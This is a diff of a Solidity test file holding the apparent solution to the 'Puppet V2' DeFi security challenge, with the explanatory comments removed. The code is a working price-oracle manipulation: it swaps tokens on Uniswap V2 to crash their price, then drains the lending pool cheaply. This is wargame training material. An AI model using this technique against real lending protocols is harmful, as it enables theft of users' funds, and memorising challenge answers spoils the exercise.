@@ -98,42 +98,26 @@ contract PuppetV2Challenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppetV2() public checkSolvedByPlayer {
-        // The exploit: Manipulate Uniswap V2 price by swapping tokens for ETH
-        // This lowers the token price, making the WETH deposit requirement much lower
-        
-        // Step 1: Approve router to spend all player tokens
+    function test_puppetV2() public checkSolvedByPlayer { 
         token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
         
-        // Step 2: Swap all tokens for ETH to crash the token price
-        // This dramatically reduces the WETH required to borrow from the pool
         address[] memory path = new address[](2);
         path[0] = address(token);
         path[1] = address(weth);
         
         uniswapV2Router.swapExactTokensForETH(
             PLAYER_INITIAL_TOKEN_BALANCE,
-            0, // accept any amount of ETH
+            0, 
             path,
             player,
             block.timestamp * 2
         );
         
-        // Step 3: Calculate how much WETH is needed to borrow all tokens from the pool
-        // After the swap, the price is much lower, so we need much less WETH
         uint256 poolBalance = POOL_INITIAL_TOKEN_BALANCE;
         uint256 wethRequired = lendingPool.calculateDepositOfWETHRequired(poolBalance);
-        
-        // Step 4: Wrap ETH to WETH (we should have enough from the swap + initial balance)
         weth.deposit{value: address(player).balance}();
-        
-        // Step 5: Approve WETH for the lending pool
         weth.approve(address(lendingPool), wethRequired);
-        
-        // Step 6: Borrow all tokens from the pool
         lendingPool.borrow(poolBalance);
-        
-        // Step 7: Transfer all borrowed tokens to recovery address
         token.transfer(recovery, token.balanceOf(player));
     }
 
